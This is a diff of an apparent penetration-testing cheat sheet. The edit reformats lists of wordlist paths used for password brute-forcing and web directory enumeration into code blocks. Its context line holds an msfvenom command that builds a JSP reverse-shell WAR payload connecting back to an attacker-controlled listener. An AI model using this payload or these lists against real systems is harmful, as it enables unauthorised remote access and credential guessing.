@@ -768,19 +768,25 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f war > runme
 ``` /usr/share/webshells ```
 
 #### Password lists:
-``` /usr/share/wordlists/fasttrack.txt``` (222) 
-``` /usr/share/wordlists/dirb/small.txt``` (900)
-``` /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt``` (1244)
-``` /usr/share/seclists/Passwords/probable-v2-top``` (207-12000)
-``` /usr/share/wordlists/dirb/common.txt``` (4614)
-``` /usr/share/wordlists/nmap.lst``` (5084)
-``` /usr/share/wordlists/metasploit/password.lst``` (88396)
+```
+/usr/share/wordlists/fasttrack.txt (222) 
+/usr/share/wordlists/dirb/small.txt (900)
+/usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt (1244)
+/usr/share/seclists/Passwords/probable-v2-top (207-12000)
+/usr/share/wordlists/dirb/common.txt (4614)
+/usr/share/wordlists/nmap.lst (5084)
+/usr/share/wordlists/metasploit/password.lst (88396)
+
+```
 #### Directory lists:
-``` /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```
-``` /usr/share/seclists/Discovery/Web-Content/common.txt```
-``` /usr/share/seclists/Discovery/Web-Content/quickhits.txt```
-``` /usr/share/seclists/Discovery/Web-Content/CGIs.txt```
-``` /usr/share/seclists/Discovery/Web-Content/raft-*```
+```
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/seclists/Discovery/Web-Content/quickhits.txt
+/usr/share/seclists/Discovery/Web-Content/CGIs.txt
+/usr/share/seclists/Discovery/Web-Content/raft-*
+```
+
 #### Fuzzing lists:
 ``` /usr/share/seclists/Fuzzing```
 ``` /usr/share/wfuzz/wordlist```
